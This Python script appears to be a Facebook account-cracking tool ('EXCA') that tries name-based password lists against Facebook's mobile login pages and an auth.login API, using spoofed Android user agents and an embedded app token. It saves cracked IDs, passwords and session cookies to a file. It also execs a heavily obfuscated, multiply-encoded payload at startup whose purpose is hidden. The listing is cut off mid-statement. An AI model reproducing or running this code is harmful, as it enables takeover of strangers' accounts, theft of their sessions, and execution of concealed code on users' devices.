import os, sys
from os import system as sm
from sys import platform as pf
import time
from time import sleep as sp
import random
import re
import aiohttp
import asyncio
import json
import binascii, gzip, marshal, zlib, lzma, bz2
from marshal import loads as ld
#sm('apt install espeak -y')
try:
    import requests, bs4, concurrent.futures, uuid, string, rich
    from rich import print as rprint
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as bsoup
    from uuid import uuid4 as uid4
except ModuleNotFoundError:
    print("Installing Missing Modules")
    sm("pip install requests bs4 futures")
#enc
gz,zl,un,se6,bzz,qp,cc,lzz=gzip.decompress,zlib.decompress,binascii.unhexlify,binascii.a2b_base64,bz2.decompress,binascii.a2b_qp,exec,lzma.decompress
#colors
r="[bold red]"
g="[bold green]"
b="[bold blue]"
y="[bold yellow]"
m="[bold magenta]"
c="[bold cyan]"
w="[bold white]"

#logo
def clear():
    if pf in ['win32','win64']:
        sm('cls')
    else:
        sm('clear')
#ua
mod=[]
ua=[]
try:
  open('dev.json','r')
except FileNotFoundError:
  cc(ld(lzz(gz(un(se6(un(qp(se6(qp(un(se6(un(qp(bzz(se6(un(se6(b'NTE2YzcwNmY0ZjU0NDY0MjU3NTM1YTU0NTc2MTQxNDQ2ZjRmNTE0MTQzNTM1NDRhNDE0MTQxNTE2NjJiNDkyZjQxNDc0MTRkMzM3YTM0MmI2NTRiMzM1ODMyNzQzMzYyNzczMzczNGQyYjZhMzQ2NDM3Nzg3MzRlNjIzNjUzMzk3MTY2NTg0ZTY1NGY0YjY0NTczOTMzNjU2MjM1MzM0ZjYxNTk1MzZkNTE1MTU2NGU3MDUwNTU0MzU1Mzk0NTY5NGI1NDMwNTE0MjRhNzA0OTUzNjE1YTRiNmE0MTZiMzk1NTZmNmY3MDcwMzY0MTQyNDM1MzU1Njk2ODZkNmY0MTY4NTM0MzRiNjE2Nzc5NTAzMDY3NmY2MzU1Nzk0NjUyNzA1MzY3NDM2YjQyNjE0NjQxMmIyZjUyNDYzOTQ5NTM0NzZiNjc2NzYxNmI1MzZmNmI1NjY5NWE2NDc5NTk0YjQzNDk0MjYxMzg2OTQ0MzA3MTQ2NGI0ZTRiNDQ1MTY4NmM1NDcxNmU0YzMwNDk0NjQxNmM0YjQyNTM0OTYzNjg3NzQ5NmU1MzQzMzg3YTM5NmI1MjJmNWE2YjY0NDM3ODY2NmM2ZjU3NzE2MTY5NGI0NTRlNjk3NTc1MzY2NTM4NmM2NDY5NzA0YTRkNTI0MTQ4NzczNTc2NjE1Njc3NzQ2NzdhNTM2MTQ2MzQ3NDMyNGE3OTdhN2EzNzY3NjMzNzc0NjE0ZjZiNDQ1Mzc3MzE0Njc1NjIzMjdhNmI3NDMyMzg3MTMzNmM2ODRjNmE0ZTMwMzA2NjRhNGY3MDc0NTY0NDc2NTk3ODYyMzU2NTU3NjM3MjdhNDk2OTQ5NTU3NDYyNGM1MTMxNzQ2ZTVhNzk2ZDY1NDQ2ODc4Nzc2ZDUzNDc0NzMwNzQ0NjZiNmY1YTczNTE0MjZjNDk1MDJiNjQ1MDYxNjY1MDZiNTY2YzRjNGM0OTc4NTY1MzZkNGEzMDQzMzI2ZTYzNjc1MTUzNDQ2OTY5Nzk2MjU1NzA3MjQyMzI2YTMwNTI2ZTcxNGYzOTM3NmIzNjc2NWE0MzU5NGI0MzRjNmQ1YTJiNTA2YjZmMzY0ZTU2NGU3MTU0NDI2OTYxNGIzNDZjMzA1MzQ0NTgzMDYzNjQzODM5Njg3MTYyMzQ0NjMyNjM3MzJiNzk2MTYyMzMzNDZmMzkzMDM5NDg3YTUxNmM0YTU3Nzg0ODUyNjI0NDU2NzI3ODQyNzA1YTU5NmE2MTYyNTM2ZjJmNGU2YTUxNTczNzQ5NTU0ZTZkMzY2MjYzMmI0ZjJiNDQ2MTQxNDk0NTRjNzg2MjcwNzI3NjM1NmIzNzY0NmU0ZjcyMmYzNTQzNjU1MjQzNDQ0MTczNTk0NjY3NjM0OTZiMzg2NjM3Mzc2ZjUyMzQ0OTM5NGI1OTY4MzQzOTMwNWEzNTc5NTk0YzZhNDI2Zjc1NmU1MzZjNzQ1NzcyNDk0NTM3Njc2MTQ3Njc3NTQyNzg3YTU1NGI2ZjY5NDk0NTQ5NDE0YTQzNDczMTY4NmQzMTY1Nzc0NzY3NDM2YTU2NjM2NTYxNDY0ZDUzNjgzMDc0Njg1MDQ5Mzk2YTQ4MzMzNzRmMmI2ZTQ3NzM1MjMwNDQ2OTQxNzEzMTRhNjk0ZTZmNzE3NjRlNzM3NTRhNmYzMjMwNTY1MzZiNTc2YzQzNTM1NzZiNzQ0ZDc2NDg0NzZhNDY0MjU5NzI1MzZiNzk3ODZiNzA0ZTMzNjQ0NzZkNjE1YTY5NmM3MzZhNDM0YTQ1MzU3NzUzNmE3NTc1NGQ3MDRlNGU0NjUxMzEzOTZlMzc1MjZjMzg3MTY2NWE3OTQ5NzczMTY5NWE3MTY5Mzc3NDYzNzg0NTc0MzE0MzM0NTQ0MzczNjI0NTQyNWE3ODUxNDUzNTc4NmQ0YTRiNjg3YTYyNDI3MDY5Nzg3MDYxNTk2MTRhNTk0YjRjNDU2ZDZiNmQ1MjQ3NmQ0OTc3NmI0ZTUxMzE0ZDYxNzU2NDRkNTI0NTU4NzI2MjMzMzM3MjRmMzY3NDM2NjE1NTMyNDM2ZDc5NGE1NDU0NTMzMDMwMzIzODU3MzM2MjU1Njg2OTcwNTk1OTRhNDM2YzJiNGI3NTcwNjM0ZDZjMzE0YzQ0NTQ1NTc2NDI1MDcwNDEzMzRiNDM1NTQxNTA3MDcwNmY1MDQ5Nzc3MDQ5NmU2MzM2NzU3MDQ2NTI0NDUzNzM3NzY5NmM1NzdhNGE2ZjU3Mzg0YTMxMmI1MDMzNWE1ODY3NzI3NTdhMzczMTY1N2EzODUwNGUzNTQyNGQ0ZTU1NjU0NjcxNzc2YjMzMmY3NjY0MmI0NzJmNjY2ZDMzNzk0OTU0MzI0MjJiNDU3MDM5Mzg1ODZiNjI1MTUwNWE0YjQ4Njc3MjQxNTY0MTZkNTk0YzZkNzg0NzZiNjk1NzY5NjgzNzZkNGU1YTRmNGQ0NjQxNDY1NTM2MzUzNjY0MzEzOTM2NTQ3ODRiNmE1YTQyMzg2NzUxNjc2NDZjNTg2MjM3NmY2MzU0NmIzNTYyNTA2Zjc0NTQzNDRkNjMzMTU5NGQ2ZDJiMzk3NTY5NjIzNjRlNGEyYjU4NjQ0ZjU5NjI2NzUwNzc1MTUxNTE1NTRkMzM1MjM5NjEzMjQyMzg0YzM0NmM2NjYzNTA3OTMzNzIzODM5Mzg3NjUwNGY0YzZlNDI0ZDZlNjI2ZTcwMzIzODc3NTU1NDM1NDkzNDUwMzA1MjM1NzczMzYzNTg0NTZmNzc2MTU4MzM0ODcxMzg1MzU5NDM3YTQ5Nzg1MTY4Mzk3Njc3MmI2NTM3MzY3NTM2NTg3MzYyNjc3MzU1Mzk0MjcyNDkzODc0NDY0Zjc3NDQ0ODZjNjczNTRmNjIyZjQ3Nzg0NzQ5NTM0NTRhNTU0MzM3NTQ2NzM0NjE2NDZmNjI3MTU5Nzg0Yzc4NGU1OTYxNjM3MTZiMzk1ODY0NGU0NDQ0Nzc1MzMxNmQ2YzRmNDY2Yzc1NTY2MTc1MzU3ODRiNTM1NzVhNjQzMjZkNjY0ZDRhNmQzNzc1MzM0ZTc4NmYzMDM5NDY1NDRiNTc1MDRjNGE2MzQ0Nzk1ODRmNTc3NzUyNzc2YTcxNjczNDc4Nzg2NjU0MzQ1YTY1NjQzMDU5NmQ2NjRmMzc0ZTZjNGQ3OTZiNDEyYjM5MmI1NDZjNzY2ZTRkNGI3OTc0NGI3OTY5NDk3NzJiNWE2ODczMzM1NjY3MzIyYjUxNmU3OTY0NzQzNTYzNDYzNjYxNzA2OTUyNGU3YTc2NDc2NTU0NTg1NDUzNjEzNDZkNGE0YzczMzczODZlNDc2Mzc0NTc1MzM4NmI2MjYyNjIzMTZjMzk3NDQyNTE1NTM2NDQzNzZiNmQ0ZDY2NzczMTJiNTc3NDVhNzc0NDM5NWEyYjc0NzMyZjUyNDgzNjdhNjc2MTZhNDg3MDUzNGU0MTc3Mzc2NDZmNTM0OTY5NjgzODQ0NzM1MjM1NzU0ZTcxNDk0ZjYxNTY3Mjc4NzQ1NTZkMzk3YTU2NjQ2ZjMzNDE2MzQxNGY3NTZkNGI3MTc1N2E0ZTUxNzc2NzRiNjU3NzJmNDQ0MzQ3MmI3OTU1NDM3MzcyNTc0OTcwMzA0ZjZhNTU3NzMyNzI3Njc1NzU3OTZkNWEzNzc0NTM2YTMwNjg3NzYzNWE0MTY3NDM0NTJiNzg0OTRkNGQ1NTc2NTE2YzRhNzM2ZDMzNzI1NzM2NTU2MjUzNGE1NTU1NjE2ZTY0NjMzMTRkMzM0ZTY0MmI2NTZjNGQ0ZTQ0NGQ1MTYxNDMzMTQzNDE0NDcwNTg0ZTQxNzk1NDYyNjE2MTZmNzA3MDMwMzUzMDRjNmM2YTVhNjM0YTQ5NmI1NzZkNmI3ODQ1NzM3NzRkNDU2YjQyNmM2OTc1NTY1Njc4MmI3MjU2NzYzNTRjMzc1NTUzNzk2ZTRmNGQ2Njc1Nzg3NTUyNDY2MzUyNjM3MzRjMzQ2MjUzNjkyYjUzNGY0YzQ3NmY0ZjM3N2E2YTZiN2E0NDRkMzE0NjM2NGU2MTc4NGU1MDdhNmI3NTc5NDM2MzcyNzM2ZTQyNGM3NzMyNzU1NDYxNTY3Mzc4NGE0NDZjNzk0MzQ2NGU1Mzc5NTQ2NDMyN2E0ZTM0NzI3NTU4MzQ0ODcxNTkzNzQyNzQ2ZDZkN2E1MzUyNGEzNTRlMzQ2NDZiNDM0NTQ5NDM0MzU2MzY3MTRiNTc0NTZiNGY0ZjVhNzI3MjU3NzQzNjcyNDU0ZDZhNGI1NTM1NGIzNjZhNjY0ZjY2NzA1NTUwNmY1ODc5NDQzMDZjNmU3ODU1NGU0ZDUxNTA1MTc2NDMzODM5NDE2MjZiNWE0NzY5NGE0NzU2NDY0ZTcyNzU0YTY4NmQ2YjdhNzAzMDYyNGU1OTczNWE0ZDU5NzQ1NjM0NzQzNTZjNzE1ODZlNjQ0YzZkNTM0Mzc2NDM0MjM0NzEyZjUzNzE2MTY3NTQ0OTMxNTI1MTU1NTE1MTU2NTE1MzcyNzg2MzVhNGM0Nzc4NTI2ZTc3NzA2MTYxMmI0OTVhNmM1ODQ4NTA0MzYzNzk2Yjc5NDg2NzY4NmE0Yjc0Nzk0NzQ2NWE3MjU2NGQ1YTUyNTI3NDY4NTIzMTRhNTk1NTYxNGU2MTU0NGU1ODUyNTA1NTRkNjE2YzM1NDM2NTRjNmI3NjUwNmU2Mzc4NGUyZjY2NTA2MzM1NTg1ODc2NTIzODQ3NTkyYjQ0NzU0MjVhNTA3MDQyNDI0OTc3Njc2ZjUwMzY2YzUyNTA0YjY1NGE0NzQ5NGI0YTUwNDU2MTY1NDU3MzQ4NmY0ZTQyN2E0ZjZiNDc0NzQ2NmY3MDU1MmY1MTRjMzY0ODZiNTQ2YTM1NjI2MjJmNTYzMDQ3NGU0OTY2NGEzODUxNjQ1OTM5NmE2ZjY1NGIzMzUwNDIzMzYyNGE2YjcyNGQ0OTQ2NTM2NzU5NmI2YTZlNTg2YTY3MzYzOTQ2NzM0NjQ2NmY0NzcwNTEzNzUxNzg3OTc3NDY3MzQ4NTU0Nzc5NzU0ODQ1NmEzOTc3MmI1ODM2NDE1MDcwMzQ0MzQ2MzU1MzUyNzI2NzU0NWE1NTY2NTE2YTUzNzY2YjQyMzE2NzZjNTk0MzY1NDE2ZTZmMzk2ODcwNTk0OTQ0NzQ2YjUzNTg3NzQxNjM2OTcwMzA2OTU1NGIzNTQzNjYzNTQ2NjY0NTQxNjY2OTZkNDY3MDQzNjc0NDQ1NDc1MzQ5Njg0MzU1NDk3NTMyMmI1YTc1NmQ2YjQ1NGY3Mzc2MmY1NzUxNTA0ZjM4MzczMjUxNGM3MDc1NGEyYjRiMzU3YTU1NmY3MjQ0NTc1NzRiNGI1NDVhNzM3MDc1MzQ2MTQ5Mzg0YTc4NzE1ODYzMzY0OTRkNDE2NzRmNGUzMjUxMzgzMDMxNTI2ZjM4NjU1NTM4NmM2OTc3NjI0ODMyNjQzMzQyMzk0YzUwNzk0ZTQ3Njg0ZDQ5NDk1ODZlNDczODM4Mzc3MjcwMzE0OTY5Mzc2ZDM5NjUyZjQ3NzE2ODU0Nzk1NTc4NWE2MTc5NTU0YTY5NDY0NTU2NDUzMTcwNGU3MTZkNmEzNTJiNzA1MzMyNmM3MDU1Nzc3MjQzMzE2NDc2NGI2ZDVhNDk2ZDYxNmY0NDMwNzI1MTQ4NDk2OTJiNDM1MTM2NjM1MzU2NDkzNTQxMzA0MTdhNmU2MzZlNzQ0ZTQzNGM1ODc5NmY1MTZkNjE1NTU5Njg3Nzc1NGI2OTJiMzIzMDY2NzM2MzZjMmY2NDY0NzYzMjczMzA0YTU5Njg0MzQ2N2EzMTUyMzE2NjRjNzg0NzQ4NTA2MjUyNzkzNzU3NzE0ZTYxNTA2Njc4Mzg2NDc3NjYzMzQzNzAzNDQzNjE0MTUwNzk1MjY0Njk0YzQ5NGY1MjQ2NjU3MTZmMzI3NDc5NzQ1Njc3NmIzMTRmNTYzMTRlNGU3NDQ3NzYyZjM2MzU2ZDcyNGE1MzQ3NmM2YzZjNGE1MzM5NzQ3NDM2NTI0YjU2NTQ2YzM0NDc0OTRhMzY2MzRjNDkzODVhNTQ0YjMwNDI1MTU2NTE2YzQ3NTYzNjQyNTQ2YTcxNzM0NDcwNGQ2MTVhNDE0ZTUxNDE1NTcxNGE1MTQzNjYzMzZmNzI3MTU1NDc2ODMwNDM1MTZiNmY3MzY5NDI0NTRiMzY0MTU1NzA0MjRiNTI1MTcwNmY2ZjU2NGU0MTYxNTU0NzZjNDc2NzQ1NzA0NjQ1NmY1NTUzNTczMTcxNGM1NTU3NzM2MjYxNzM1NjU2NDczMDU2NzI1ODJiNDYzMzRhNDY0ZjQ2NDM1MTZmNDE0ZjY3MzU0MTNkM2QwYQ==\n'))))))))))))))))))
xxxx=open('dev.json','r').read()
bnb=json.loads(xxxx)
#bnb=httpx.get("https://raw.githubusercontent.com/pbakondy/android-device-list/master/devices.json").json()
for bnbm in bnb:
  if "GT-" in bnbm['model'] or "RMX" in bnbm['model'] or "OPPO" in bnbm['model'] or "SM-" in bnbm['model'] or "CPH" in bnbm['model'] or "LG" in bnbm['model'] or "M200" in bnbm['model'] or "vivo" in bnbm['model'] or "Lenovo" in bnbm['model'] or "motorola" in bnbm['model'] or 'SAMSUNG' in bnbm['model'] or "SAMSUNG" in bnbm['model'] or "ASUS" in bnbm['model'] or "MI " in bnbm['model'] or "Infinix" in bnbm['model'] or "HUAWEI" in bnbm['model'] or "Redmi" in bnbm['model'] or "ZTE" in bnbm['model']:
    mod.append(bnbm['model'])
for agent in range(90000,99999):
    model=random.choice(mod)
    fff=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
    qp1a=(f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}")
    iab=f"[FB_IAB/{random.choice(['FB4A','MESSENGER','Orca-Android','MessengerLite'])};FBAV/{random.randint(80,400)}.0.0.{random.randint(10,25)}.{random.randint(100,300)};]"
    fban=f"[FBAN/EMA;FBLC/en_US;FBAV/{random.randint(80,400)}.0.0.{random.randint(10,30)}.{random.randint(100,200)};]"
    firef=f"Firefox/{random.randint(70,120)}{random.choice(['.0','.0','.1','.2','.3','.1.1','.1.2','.1.0','.1.1','.1.3','.1.4','.2.0','.2.1','.2.2','.2.3','.3.0','.3.1','.3.2','.3.3','.4.0'])}"
    ranb=random.choice([qp1a])
    las=random.choice([iab,fban,firef])
    firefox=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {model} Build/{ranb}) Gecko/114.0 {firef}"
    moz=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {model} Build/{ranb}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 {las}"
    kiwi=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {model} Build/{ranb}) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36"
    ran=random.choice([moz,kiwi,firefox])
    ua.append(ran)
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']:creation = '[bold yellow]2009'
        elif ids[:9] in ['100000000']:creation = '[bold yellow]2009'
        elif ids[:8] in ['10000000']:creation = '[bold yellow]2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '[bold yellow]2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '[bold yellow]2010'
        elif ids[:6] in ['100001']:creation = '[bold yellow]2010[bold white]/[bold yellow]2011'
        elif ids[:6] in ['100002','100003']:creation = '[bold yellow]2011[bold white]/[bold yellow]2012'
        elif ids[:6] in ['100004']:creation = '[bold yellow]2012[bold white]/[bold yellow]2013'
        elif ids[:6] in ['100005','100006']:creation = '[bold yellow]2013[bold white]/[bold yellow]2014'
        elif ids[:6] in ['100007','100008']:creation = '[bold yellow]2014/2015[/]'
        elif ids[:6] in ['100009']:creation = '[bold yellow]2015'
        elif ids[:5] in ['10001']:creation = '[bold yellow]2015[bold white]/[bold yellow]2016'
        elif ids[:5] in ['10002']:creation = '[bold yellow]2016[bold white]/[bold yellow]2017'
        elif ids[:5] in ['10003']:creation = '[bold yellow]2018[bold white]/[bold yellow]2019'
        elif ids[:5] in ['10004']:creation = '[bold yellow]2019[bold white]/[bold yellow]2020'
        elif ids[:5] in ['10005']:creation = '[bold yellow]2020'
        elif ids[:5] in ['10006','10007']:creation = '[bold yellow]2021'
        elif ids[:5] in ['10008']:creation = '[bold yellow]2022'
        else:creation='[bold yellow]2023'
    elif len(ids) in [9,10]:creation = '[bold yellow]2008/2009'
    elif len(ids)==8:creation = '[bold yellow]2007/2008'
    elif len(ids)==7:creation = '[bold yellow]2006/2007'
    else:creation='[bold yellow]2023'
    return creation
def logo():
    rprint("""

              {}███████╗{}██╗  ██╗{} █████╗ {} █████╗
              {}██╔════╝{}╚██╗██╔╝{}██╔══██╗{}██╔══██╗
              {}█████╗{}   ╚███╔╝ {}██║  ╚═╝{}███████║
              {}██╔══╝{}   ██╔██╗ {}██║  ██╗{}██╔══██║
              {}███████╗{}██╔╝╚██╗{}╚█████╔╝{}██║  ██║
              {}╚══════╝{}╚═╝  ╚═╝{} ╚════╝ {}╚═╝  ╚═╝
{}
                     [bold red]Develop By [bold cyan]Pablo
{}[/]""".format(r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,"[bold cyan]="*os.get_terminal_size().columns,"[bold cyan]="*os.get_terminal_size().columns))
def lines():
    rprint("[bold cyan]="*os.get_terminal_size().columns)
async def login():
  check=requests.get("https://pastebin.com/raw/Nr9LuZ4u").text
  clear()
  logo()
  login=input("\033[1;36mEnter Your Username: \033[1;31m")
  if login == "mrdeath":
    await main()
  elif login in check:
    await bypass()
  else:
    sys.exit()
loop=0
oks=[]
cps=[]
def main():
    try:
        clear()
        logo()
        rprint(" {}[{}1{}] {}File Cloning\n {}[{}2{}]{} Exit".format(m,c,m,g,m,c,m,r))
        lines()
        xx=input(" \033[1;36mChoose Number: \033[1;37m")
        if xx == "1":
            clear()
            logo()
            fi=input("\033[1;36m Enter Your File: \033[1;37m")
            try:
                fi2=open(fi,'r').read().splitlines()
            except FileNotFoundError:
                rprint("{}File Not Found".format(r))
                sp(3)
                main()
            clear()
            logo()
            rprint(" {}Choose Method\n\n {}[{}1{}]{} Method 1 {}({}Doesn't Consume Much GB{})\n {}[{}2{}]{} Method 2{} ({}FAST{})[/]".format(y,m,c,m,y,c,g,c,m,c,m,y,c,g,c))
            lines()
            meth=input("\033[1;32m Choose Method: \033[1;36m")
            lines()
            passw=[]
            try:
                pas_limit=int(input("{}How Many Passwords:".format("\033[1;32m")));lines()
            except ValueError:
                pas_limit=1
            for i in range(pas_limit):
                x=input(f"Enter Password {i+1}: ")
                passw.append(x)
            with tred(max_workers=30) as exca_sub:
                clear()
                logo()
                print(f" \033[1;32mTotal IDS:\033[1;36m {len(fi2)}\n \033[1;32mPasswords:\033[1;32m {len(passw)}")
                lines()
                print(" \033[1;32mOK IDS SAVE IN\n/sdcard/exca-ok.txt")
                lines()
                for user in fi2:
                    ids,names=user.split("|")
                    passlist=passw
                    if meth in ['1','01']:
                        exca_sub.submit(m1,ids,names,passlist)
                    elif meth in ['2','02']:
                        exca_sub.submit(m2,ids,names,passlist)
                    else:
                        exit()
            lines()
            rprint("{} Cracking Is Finish".format(g))
            lines()
            rprint("{} OK IDS/{}".format(g,len(oks)))
        else:
            rprint(" [bold red]QUITTING[/]")
            sp(5)
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
def m1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write("\r\r\033[1;36m EXCA\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
    session=requests.Session()
    try:
        first = names.split(" ")[0]
        try:
            last = names.split(" ")[1]
        except:
            last = "Exca"
        fs=first.lower()
        las=last.lower()
        for pass2 in passlist:
            pas = pass2.replace('First',first).replace("Last",last).replace("first",fs).replace("last",las)
            ccc=random.choice(ua)
            headers={
                    'authority': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dpr': '3',
                    'origin': 'https://m.facebook.com',
                    'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
                    'sec-ch-ua-mobile': '?1',
                    #'sec-ch-ua-model': f'"{modelsss}"',
                    'sec-ch-ua-platform': f'"Android"',
                    #'sec-ch-ua-platform-version': f'"{random.randint(4,13)}{random.choice(["",".0.0",".0",".1.2",".0.1","","","",".0.2"])}"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ccc,
                    'viewport-width': '980',
                    }
            getlog=session.get(f"https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr")
            data={
                    "lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                    "uid":ids,
                    "next":"https://free.facebook.com/login/save-device/",
                    "flow":"login_no_pin",
                    "pass":pas,
                }
            comp = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0",headers=headers,data=data)
            exc=session.cookies.get_dict().keys()
            cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            if "c_user" in exc:
                rprint(" [bold green]\n[OK] USERID: [bold cyan]%s\n[bold green] PASS: [bold cyan]%s\n [bold green]DATE: %s\n [bold green]COOKIES: [bold cyan]%s[/]"%(ids,pas,joined(ids),cookie))
                open("/sdcard/exc-ok.txt","a").write(ids+" >> "+pas+" >> "+cookie)
                oks.append(ids)
                break
            elif "checkpoint" in exc:
                cps.append(ids)
                break
            else:
                continue
    except requests.exception.ConnectionError:
        sp(10)
    loop+=1
def m2(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write("\r\r\033[1;36m EXCA\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': '', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'62f8ce9f74b12f84c123cc23437a4a32'
              
            }
            build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(10,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            fbbb = random.randint(200000000,300000000)
            fbob = random.randint(200000000,300000000)
            qp1a = f"QP1A.{random.randint(100000,200000)}.0{random.randint(10,25)}"
            fbpnnn=random.choice(['FB4A','Orca-Android'])
            if fbpnnn == "FB4A":
              fbpnn="katana"
            elif fbpnnn == "Orca-Android":
              fbpnn="orca"
            builld = random.choice([build,qp1a])
            fbccr=random.choice(['TM','GLOBE','SMART','TNT'])
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.25,width=720,height=1280};FBLC/en_US;FBRV/256855919;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-J510FN;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/278218861;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"%(fbpnn)+f" 